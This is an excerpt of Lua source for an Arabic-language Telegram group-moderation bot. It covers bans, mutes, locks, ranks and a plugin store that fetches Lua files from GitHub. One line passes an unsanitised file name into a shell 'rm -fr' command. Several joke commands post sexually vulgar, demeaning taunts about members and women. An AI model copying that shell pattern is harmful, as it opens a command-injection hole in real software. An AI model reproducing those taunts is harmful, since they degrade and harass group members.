local Name = '[《👇اتبع الازرار للتواصل مع》](t.me/xx_Source_JACK)\n['..result.first_name_..'](tg://user?id='..result.id_..')\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = ''..result.first_name_..'', url = "https://t.me/"..result.username_..""},
...
local Text ='مرحبا إليك تويت بالصور 𖤛' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
...
local Text ='مرحبا إليك حروف بالصوره 𖤛' 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'اضف البوت الي مجموعتك' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
} 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤛 تم تعطيل جلب الصوره ،\n 𖤛 تم قفل البوتات  ،\n 𖤛 تم قفل التكرار ،\n 𖤛 تم قفل الروابط ،\n 𖤛 تم قفل التوجيه ،\n 𖤛 تم قفل الملصقات ،\n 𖤛 تم قفل المتحركه ،\n 𖤛 تم قفل الفيديو ،\n 𖤛 تم قفل الفشار ،\n 𖤛 تم قفل الانلاين ،\n 𖤛 تم قفل تعديل المديا ،\n 𖤛 تم وضع التكرار  ،\n 𖤛 تم قفل الفارسيه  ،\n 𖤛 تم وضع الايدي بدون صوره ،n  \n 𖤛 تم تفعيل الحمايه  بواسطه ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤛 تم تفعيل جلب الصوره ،\n 𖤛 تم  فتح البوتات  ،\n 𖤛 تم  فتح التكرار ،\n 𖤛 تم  فتح الروابط ،\n 𖤛 تم  فتح التوجيه ،\n 𖤛 تم  فتح الملصقات ،\n 𖤛 تم  فتح المتحركه ،\n 𖤛 تم  فتح الفيديو ،\n 𖤛 تم  فتح الفشار ،\n 𖤛 تم  فتح الانلاين ،\n 𖤛 تم  فتح تعديل المديا ،\n 𖤛 تم وضع التكرار  ،\n 𖤛 تم  فتح الفارسيه  ،\n 𖤛 تم وضع الايدي بصوره،n \n 𖤛 تم تفعيل الحمايه  بواسطه ، [↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..')  ')
end,nil)   
end
...
database:set(bot_id.."lock:text"..msg.chat_id_,true) 
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data)  
send(msg.chat_id_, msg.id_,' 𖤛  مـن قبـل  ⇇[↝'..Rutba(msg.sender_user_id_,msg.chat_id_)..'↜](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤛 تـم قفـل الدردشه ')
end,nil)   
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
send(msg.chat_id_, msg.id_,' 𖤛  مـن قبـل  ⇇['..string.sub(data.first_name_,0,60)..'](T.ME/'..(data.username_ or 'textchuser')..') \n 𖤛 تـم قفـل التاك بالكتم ')
end,nil)   
...
if tonumber(result.sender_user_id_) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع حظر صاحب السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1284934171) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع حظر صاحب التليجرام عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع حظر مالك السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع حظر مطور السورس عام")
return false 
end
...
function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'xx_Source_JACK')..')'
status  = '\n 𖤛 تم حظرو عام من الجروبات '
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
...
if result.id_ == tonumber(71) then
send(msg.chat_id_, msg.id_, " 𖤛 لا يمكنك حظر صاحب السورس \n")
return false 
end
...
usertext = '\n 𖤛 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'xx_Source_JACK')..')'
status  = '\n 𖤛 تم حظرو عام من الجروبات '
texts = usertext..status
...
if tonumber(userid) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع حظر صاحب السورس عام")
return false 
end
...
if tonumber(result.sender_user_id_) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع كتم صاحب السورس عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(1284934171) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع كتم صاحب التليجرام عام")
return false 
end
if tonumber(result.sender_user_id_) == tonumber(71) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع كتم مالك السورس عام")
return false 
end
...
if result.id_ == tonumber(71) then
send(msg.chat_id_, msg.id_, " 𖤛 لا يمكنك كتم صاحب السورس \n")
return false 
end
if result.id_ == tonumber(1284934171) then
send(msg.chat_id_, msg.id_, " 𖤛 لا يمكنك كتم صاحب التليجرام \n")
return false 
end
if result.id_ == tonumber(71) then
send(msg.chat_id_, msg.id_, " 𖤛 لا يمكنك كتم مالك السورس \n")
return false 
end
usertext = '\n 𖤛 الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'xx_Source_JACK')..')'
status  = '\n 𖤛 تم كتمه عام من الجروبات'
...
t = ' 𖤛 ملفات السورس 𝙅𝘼𝘾𝙆 𓃠≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛━┅┄⟞⟦𝚂𝙾𝚄𝚁𝙲𝙴 𝚅??𝙅𝘼𝘾𝙆 𓃠⟧⟝┄┉━𖤛 \n'
i = 0
for v in io.popen('ls File_Bot'):lines() do
if v:match(".lua$") then
i = i + 1
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/Ffasit/sherifmohamed1/shico/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n 𖤛 اهلا بك في متجر ملفات 𝙅𝘼𝘾𝙆 𓃠\n 𖤛 ملفات السورس ≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n◤━───━??𝗼𝗼𝗼𝗻━───━◥\n\n"
local TextE = "\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n 𖤛 علامة تعني { ✔️ } ملف مفعل\n 𖤛 علامة تعني { ✖ } ملف معطل\n 𖤛 قناة سورس 𝙅𝘼𝘾𝙆 𓃠≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n".." 𖤛 [اضغط هنا لدخول](t.me/xx_Source_JACK) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/Ffasit/sherifmohamed1/shico/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," 𖤛 عذرا الملف لايدعم سورس 𝙅𝘼𝘾𝙆 𓃠\n") 
end
return false
end
...
if text == ("مسح قائمه 𝙅𝘼𝘾𝙆 𓃠") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n 𖤛 تم مسح قائمه 𝙅𝘼𝘾𝙆 𓃠')
return false
end

if text == 'قائمه 𝙅𝘼𝘾𝙆 𓃠' and Sudo(msg) then
...
if #list == 0 then
t = " 𖤛 لا يوجد احد في قائمه 𝙅𝘼𝘾𝙆 𓃠"
end
send(msg.chat_id_, msg.id_, t)
return false
end
...
if text == ("رفع 𝙅𝘼𝘾𝙆 𓃠") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع 𝙅𝘼𝘾𝙆 𓃠@(.*)$") and Sudo(msg) then
local username = text:match("^رفع 𝙅𝘼𝘾𝙆 𓃠@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^رفع 𝙅𝘼𝘾𝙆 𓃠(%d+)$") and Sudo(msg) then
local userid = text:match("^رفع 𝙅𝘼𝘾𝙆 𓃠(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text == ("تنزيل 𝙅𝘼𝘾𝙆 𓃠") and msg.reply_to_message_id_ and Sudo(msg) then
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل 𝙅𝘼𝘾𝙆 𓃠@(.*)$") and Sudo(msg) then
local username = text:match("^تنزيل 𝙅𝘼𝘾𝙆 𓃠@(.*)$")
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
if text and text:match("^تنزيل 𝙅𝘼𝘾𝙆 𓃠(%d+)$") and Sudo(msg) then
local userid = text:match("^تنزيل 𝙅𝘼𝘾𝙆 𓃠(%d+)$") 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
t = " 𖤛 المنشئين الاساسين تعالو مخرب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
...
if #list == 0 then
t = " 𖤛 ماكو منششئين يشوفولك جاره"
end
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖤛 قام بنشر ملصق اباحيه\n"..t)  
...
Reply_Status(msg,msg.sender_user_id_,"reply"," 𖤛 قام بنشر صوره اباحيه\n"..t)  
DeleteMessage(msg.chat_id_,{[0] = tonumber(msg.id_),msg.id_})   
end   
end
...
send(msg.chat_id_, msg.id_," 𖤛 منشئ الجروب  ⇇["..b.first_name_.."](T.me/"..UserName..")")  
end,nil)   
end
end
end,nil)   
...
Reply_Status(msg,result.sender_user_id_,"reply","𖤛 تم ترقيته مطور ثانوي في البوت")  
end
...
Reply_Status(msg,result.id_,"reply","𖤛 تم ترقيته مطور ثانوي في البوت")  
else
...
Reply_Status(msg,userid,"reply","𖤛 تم ترقيته مطور ثانوي في البوت")  
return false 
end
...
Reply_Status(msg,result.sender_user_id_,"reply","𖤛 تم تنزيله من المطور ثانويين")  
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, Function_DRAGON, nil)
return false 
end
...
Reply_Status(msg,result.id_,"reply","𖤛 تم تنزيله من المطور ثانويين")  
else
send(msg.chat_id_, msg.id_,"𖤛 لا يوجد حساب بهاذا المعرف")
end
end
...
Reply_Status(msg,userid,"reply","𖤛 تم تنزيله من المطور ثانويين")  
return false 
end
if text == ("الثانوين") and SudoBot(msg) then
local list = database:smembers(bot_id.."Dev:SoFi:2")
...
send(msg.chat_id_, msg.id_, "\n 𖤛 تم مسح قائمة المطورين الثانوين  ")
end
------------------------------------------------------------------------
...
tdcli_function ({ID = "GetUser",user_id_ = userid},function(arg,data) 
if data.first_name_ then
usertext = '\n 𖤛 لعضو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤛 تم تنزيله من المميزين'
send(msg.chat_id_, msg.id_, usertext..status)
else
usertext = '\n 𖤛 الـعـضو   ⇇'..userid..''
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤛 تم رفع الـعـضو  متوحد في الجروب \n'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤛 تم تنزيل الـعـضو  متوحد في الجروب\n'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
t = "\n 𖤛 قائمه زوجات الجروب \n 𖤛═───═❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳═───═??\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 العضــو  ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تنزيل جميع البقرات بالجروب')
end
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
local  statuss  = '\n 𖤛 تم رفع بقره في الجروب\n 𖤛 ها يالهايشه تع احلبك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم تنزيل جميع القلوب ')
end
if text == ("تاك لقلبي") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤛 قائمة القلوب في الجروب\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."← قلبي [@"..username.."]\n"
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم تنزيل جميع أولادي')
end
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم تنزيل جميع زواحف')
end
if text == ("تاك للرقاصات") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤛 قائمة رقاصات الجروب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'xx_Source_JACK')..')'
local statuss = '\n 𖤛 تم رفع رقاصه في الجروب\n 𖤛 مبقتش شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'xx_Source_JACK')..')'
status = '\n 𖤛 تم تنزيل رقاصه من الجروب\n 𖤛 بقت شريفه لا اله الي الله'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
send(msg.chat_id_, msg.id_, ' 𖤛 تم تنزيل جميع جريزي')
end
if text == ("تاك للمتناكين") and Mod(msg) then
local list = database:smembers(bot_id..'Jred:User'..msg.chat_id_)
t = "\n 𖤛 قائمة المتناكين الجروب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'xx_Source_JACK')..')'
local statuss = '\n 𖤛 تم رفع الـعـضو  علي زبك بنجاح\n 𖤛 تفضل ابدا نيك'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Zahf:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم مسح كل الحكاكين')
end
if text == ("تاك للحكاكين") and Mod(msg) then
local list = database:smembers(bot_id..'Zahf:User'..msg.chat_id_)
t = "\n 𖤛 قائمة حكاكين الجروب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖤛 تم رفع حكاك في الجروب\n 𖤛 احمرت ولا لسا'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤛 تم تنزيل حكاك من الجروب\n 𖤛 لا يسطت هيفضل حكاك رسمي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Girl:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم مسح كل النسوان بالجروب')
end
if text == ("تاك للنسوان") and Mod(msg) then
local list = database:smembers(bot_id..'Girl:User'..msg.chat_id_)
t = "\n 𖤛 قائمة نسوان الجروب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
local  statuss  = '\n 𖤛 تم رفع مره في الجروب\n 𖤛 ها صرتي من نسواني تعي ندخل'
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو  ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤛 تم تنزيل مره من الجروب\n 𖤛 بتاعي غضبان عليكي ليوم الدين'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:del(bot_id..'Mode:User'..msg.chat_id_)
send(msg.chat_id_, msg.id_, ' 𖤛 تم مسح جميع المتزوجين')
end
if text == ("تاك للمتزوجين") and Mod(msg) then
local list = database:smembers(bot_id..'Mode:User'..msg.chat_id_)
t = "\n 𖤛 قائمه ازواج الجروب \n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'DEVBESSO')..')'
local  statuss  = '\n 𖤛 تم زواجكم بنجاح في الجروب \n 𖤛 الطلاق امتي عشان ابقي موجود '
send(msg.chat_id_, msg.id_, usertext..statuss)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
database:srem(bot_id..'Mode:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 العضــو ← ['..data.first_name_..'](t.me/'..(data.username_ or 's_o_op')..')'
status  = '\n 𖤛 تم طلاقكم بنجاح في الجروب\n 𖤛 اوجعو تاني ونبي'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
end
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.reply_to_message_id_)}, start_function, nil)
...
if database:get(bot_id..'Lock:Add:Bot'..msg.chat_id_) and not Constructor(msg) then
send(msg.chat_id_, msg.id_,' 𖤛 تم تعطيل القتل') 
return false
end
function start_function(extra, result, success)
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
...
function start_function(extra, result, success)
if tonumber(result.sender_user_id_) == tonumber(bot_id) then  
send(msg.chat_id_, msg.id_, " 𖤛 لا تسطيع تقيد البوت ")
return false 
end
if Can_or_NotCan(result.sender_user_id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤛 عذرا لا تستطيع تقيد ( '..Rutba(result.sender_user_id_,msg.chat_id_)..' )')
else
...
if Can_or_NotCan(result.id_, msg.chat_id_) then
send(msg.chat_id_, msg.id_, '\n 𖤛 عذرا لا تستطيع تقيد ( '..Rutba(result.id_,msg.chat_id_)..' )')
return false 
end      
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛 الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤛 تم تقيده لمدة ~ { '..TextEnd[2]..' '..TextEnd[3]..'}'
send(msg.chat_id_, msg.id_, usertext..status)
end,nil)
https.request("https://api.telegram.org/bot"..token.."/restrictChatMember?chat_id="..msg.chat_id_.."&user_id="..result.sender_user_id_..'&until_date='..tonumber(msg.date_+Time))
end
...
send(msg.chat_id_, msg.id_, '\n 𖤛 عذرا لا تستطيع تقيد ( '..Rutba(userid,msg.chat_id_)..' )')
else
...
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n 𖤛  الـعـضو   ⇇['..data.first_name_..'](t.me/'..(data.username_ or 'textchuser')..')'
status  = '\n 𖤛  الايدي  ⇇`'..result.sender_user_id_..'`\n 𖤛  تم تنزيله ادمن من الجروب بكل الصلاحيات'
send(msg.chat_id_, msg.id_, usertext..status)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.sender_user_id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
end,nil)
end
...
usertext = '\n 𖤛  الـعـضو   ⇇['..result.title_..'](t.me/'..(username or 'textchuser')..')'
status  = '\n 𖤛  تم تنزيله مشرف من الجروب بكل الصلاحيات'
texts = usertext..status
send(msg.chat_id_, msg.id_, texts)
https.request("https://api.telegram.org/bot"..token.."/promoteChatMember?chat_id=" .. msg.chat_id_ .. "&user_id=" ..result.id_.."&can_change_info=false&can_delete_messages=false&can_invite_users=false&can_restrict_members=false&can_pin_messages=false&can_promote_members=false")
else
...
local text = 
'\n❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳'..
'\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫'..
'\n 𖤛 اعدادات الجروب كتالي ☆'..
'\nء≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫'..
...
' }\nء⧬━┅┅┄⟞❲[𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛](t.me/xx_Source_JACK)❳⟝┄┉┉━⧬'..
'\n 𖤛  علامة ال {✓} تعني مفعل'..
'\n 𖤛  علامة ال {✘} تعني معطل'..
'\nء≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫'..
'\n'..' 𖤛  امر صيح  ⇇{ '..kickme..
' }\n'..' 𖤛  امر اطردني  ⇇{ '..sehuser..
' }\n'..' 𖤛  امر منو ضافني  ⇇{ '..addme..
' }\n'..' 𖤛  الردود  ⇇{ '..rdmder..
' }\n'..' 𖤛  الردود العامه  ⇇{ '..rdsudo..
' }\n'..' 𖤛  الايدي  ⇇{ '..idgp..
' }\n'..' 𖤛  الايدي بالصوره  ⇇{ '..idph..
' }\n'..' 𖤛  الرفع  ⇇{ '..setadd..
' }\n'..' 𖤛  الحظر  ⇇{ '..banm..' }\n\n 𖤛═───═❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳═───═ 𖤛\n 𖤛 قناة سورس 𝙅𝘼𝘾𝙆 𓃠≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\n [ ❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳](t.me/xx_Source_JACK) \n'
send(msg.chat_id_, msg.id_,text)     
end
...
tdcli_function({ID="UnpinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100','')},function(arg,data) 
if data.ID == "Ok" then
send(msg.chat_id_, msg.id_," 𖤛 تم الغاء تثبيت الكل")   
...
send(msg.chat_id_, msg.id_, t..'≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫\nاضغط علي الاسم ليتم نسخه\n≪━━━━━━ 𝙅𝘼𝘾𝙆 𓃠━━━━━━≫ٴ\n 𖤛 ❲[《𖤛𝐒𝐎𝐔𝐑𝐒𝐄 𝙅𝘼𝘾𝙆 𓃠𖤛》 ](t.me/xx_Source_JACK)❳ 𖤛 ')
end
...
if Constructor(msg) then  
database:set(bot_id.."pp_photo:status"..msg.chat_id_,true) 
send(msg.chat_id_, msg.id_," 𖤛 تم تفعيل نسبه جمالك") 
return false  
end
end
...
if Constructor(msg) then  
database:del(bot_id.."pp_photo:status"..msg.chat_id_) 
send(msg.chat_id_, msg.id_," 𖤛 تم تعطيل نسبه جمالك") 
return false end
end
if text == "الرابط" then 
...
send(msg.chat_id_, msg.id_,' 𖤛 تم ازالة صورة الجروب') 
end
return false  
end
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تفعيل ترحيب الجروب') 
return false  
end
...
send(msg.chat_id_, msg.id_,' 𖤛 تم تعطيل ترحيب الجروب') 
return false  
end
if text == 'مسح الترحيب' or text == 'مسح الترحيب' then 
if Mod(msg) then
database:del(bot_id..'Get:Welcome:Group'..msg.chat_id_) 
send(msg.chat_id_, msg.id_,' 𖤛 تم ازالة ترحيب الجروب') 
end
end
...
if (c - x) == 0 then
send(msg.chat_id_, msg.id_, " 𖤛 لا توجد بوتات في الجروب")
else
...
local f = ' 𖤛 عدد البوتات التي هي ادمن >> {'..t..'}\n 𖤛 ملاحضه علامة ال ( 𖤛) تعني ان البوت ادمن \n'
...
send(msg.chat_id_, msg.id_," 𖤛 تم حفظ قوانين الجروب") 
database:del(bot_id.."Set:Rules:" .. msg.chat_id_ .. ":" .. msg.sender_user_id_)
end  
...
if Mod(msg) then
send(msg.chat_id_, msg.id_," 𖤛 تم ازالة قوانين الجروب")  
...
if blakrt == 'مميز' and Mod(msg) then
send(msg.chat_id_, msg.id_,'\n 𖤛 الـعـضو   ⇇['..result.title_..'](t.me/'..(text1[3] or 'textchuser')..')'..'\n 𖤛 تم رفعه '..text1[2]..'')   
database:sadd(bot_id..'Special:User'..msg.chat_id_,result.id_)  
...
if num > 1000 then 
send(msg.chat_id_, msg.id_,' 𖤛تستطيع التنظيف 1000 رساله كحد اقصى') 
return false  
end  
local msgm = msg.id_
for i=1,tonumber(num) do
...
